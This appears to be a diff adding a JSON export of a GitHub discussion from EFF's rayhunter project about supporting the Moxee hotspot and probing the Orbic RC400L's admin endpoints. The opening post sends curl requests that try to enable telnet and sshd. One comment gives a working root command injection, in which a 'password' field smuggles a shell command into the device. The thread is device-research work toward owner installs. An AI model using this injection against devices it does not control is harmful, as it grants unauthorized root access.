@@ -1,0 +1,59 @@
+{
+  "id": "D_kwDOKrJqmc4AhMle",
+  "number": 528,
+  "title": "support for Moxee Mobile Hotspot (and some braindump about orbic)",
+  "body": "https://www.moxee.com/hotspot\r\n\r\nI took a look at this device, and so did @oopsbagel independently. Here's what we know:\r\n\r\n* it's the same platform as the verizon orbic rc400l, the admin ui looks identical\r\n* the same endpoints exist\r\n* however, the serial command to enable ADB doesn't do anything\r\n\r\nI took a look at the orbic's `goahead` binary with ghidra, to learn something about either the orbic or the moxee hotspot.\r\n\r\n### SetPortMode\r\n\r\nthis endpoint is available on both moxee and orbic. it looks like it is supposed to set usb composition, according to ghidra. you can find it by searching for SetPortMode in ghidra's strings table, in `goahead` binary.\r\n\r\n```\r\n$ curl 'http://192.168.1.1/action/SetPortMode' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: http://localhost:8080/common/home.html' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H 'Cookie: -goahead-session-=::webs.session::07d0a03f96c172c7e29a106affc946b1' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{\"mode\": \"1\"}'\r\n\r\n```\r\n\r\nreturns `{\"retcode\": 100}` but I don't know why. tried a few variants (`\"1\"` vs `1`) but nothing changes\r\n\r\n### SetRemoteAccessCfg\r\n\r\nalso available in both devices. is supposed to launch telnet and/or sshd. does not work:\r\n\r\n```\r\ncurl 'http://192.168.1.1/action/SetRemoteAccessCfg' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: http://localhost:8080/common/home.html' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H \"Cookie: -goahead-session-=::webs.session::07d0a03f96c172c7e29a106affc946b1\" -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{\"sshd\": 1, \"telnetd\": 1}'\r\n```\r\n\r\nreturns `{\"retcode\": 0}` (success) but nothing is launched",
+  "author": {
+    "login": "untitaker",
+    "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+    "url": "https://github.com/untitaker"
+  },
+  "created_at": "2025-08-08T15:17:47Z",
+  "updated_at": "2025-08-23T14:41:18Z",
+  "closed": true,
+  "locked": false,
+  "url": "https://github.com/EFForg/rayhunter/discussions/528",
+  "category": {
+    "id": "DIC_kwDOKrJqmc4Cofi5",
+    "name": "Ideas",
+    "description": "Share ideas for new features",
+    "emoji": ":bulb:",
+    "is_answerable": false
+  },
+  "labels": [],
+  "comments": [
+    {
+      "id": "DC_kwDOKrJqmc4A1oT3",
+      "body": "## Root RCE over network for Orbic RC400L\r\n\r\n(substitute seession cookie)\r\n\r\n```\r\ncurl 'http://192.168.1.1/action/SetRemoteAccessCfg' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: http://localhost:8080/common/home.html' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H \"Cookie: -goahead-session-=::webs.session::b575a7b39cecdb2871ed7da0aa660aea\" -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{\"password\": \"\\\"; reboot; #\"}'\r\n```",
+      "author": {
+        "login": "untitaker",
+        "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+        "url": "https://github.com/untitaker"
+      },
+      "created_at": "2025-08-09T18:15:10Z",
+      "updated_at": "2025-08-09T18:15:10Z",
+      "is_answer": false,
+      "replies": [],
+      "minimized_reason": null,
+      "is_minimized": false
+    },
+    {
+      "id": "DC_kwDOKrJqmc4A2KG7",
+      "body": "Version 0.6.0 now supports the Moxee https://efforg.github.io/rayhunter/moxee.html",
+      "author": {
+        "login": "untitaker",
+        "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+        "url": "https://github.com/untitaker"
+      },
+      "created_at": "2025-08-23T14:41:18Z",
+      "updated_at": "2025-08-23T14:41:20Z",
+      "is_answer": false,
+      "replies": [],
+      "minimized_reason": null,
+      "is_minimized": false
+    }
+  ],
+  "answer": null,
+  "answer_chosen_at": null,
+  "state_reason": "RESOLVED"
+}
